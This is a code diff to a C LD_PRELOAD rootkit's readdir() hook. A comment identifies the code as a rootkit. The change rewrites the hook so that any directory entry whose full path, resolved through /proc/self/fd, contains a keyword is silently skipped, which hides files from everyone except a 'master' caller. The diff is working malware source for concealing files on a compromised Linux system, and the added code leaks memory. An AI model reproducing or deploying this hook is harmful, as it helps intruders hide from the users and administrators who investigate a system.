@@ -118,29 +118,37 @@ DIR *opendir64(const char *name){
 struct dirent *readdir(DIR *dirp){
   
     struct dirent *dir;
+    char path[PATH_MAX + 1];
 
     if(!old_readdir){
 	old_readdir = dlsym(RTLD_NEXT,"readdir");
     }
 
-    dir = old_readdir(dirp);
-
-    if(dir == NULL){
-	return 0;
+    if(ismaster() == 0){
+	return old_readdir(dirp);	
     }
-    if(strcmp(dir->d_name, ".\0") == 0){
-	return 0;
-    }
+    
+    //honestly so many other ld_preload rootkits use this method
+    //and my methods were breaking so fuck it
+    do{
+	dir = old_readdir(dirp);
+	
+	if(dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0))
+	    continue;
 
-    //hides via keyword. Needs more testing
-    if(strstr(dir->d_name, keyword)){
-	if(ismaster() != 0){
-	    errno = EIO;
-	    return 0;
+	if(dir != NULL){
+	    int fd = dirfd(dirp);
+	    char fd_path[256];
+	    char *dir_name = malloc(256);
+	    memset(dir_name, 0, 256);
+	    snprintf(fd_path,255,"/proc/self/fd/%d", fd);
+	    readlink(fd_path, dir_name, 255);
+	    snprintf(path, sizeof(path) - 1, "%s/%s", dir_name, dir->d_name);
+
 	}
-    }
 
-    //printf("hit\n");
+    }while(dir && strstr(path, keyword) != 0);
+
     return dir;
 
 }
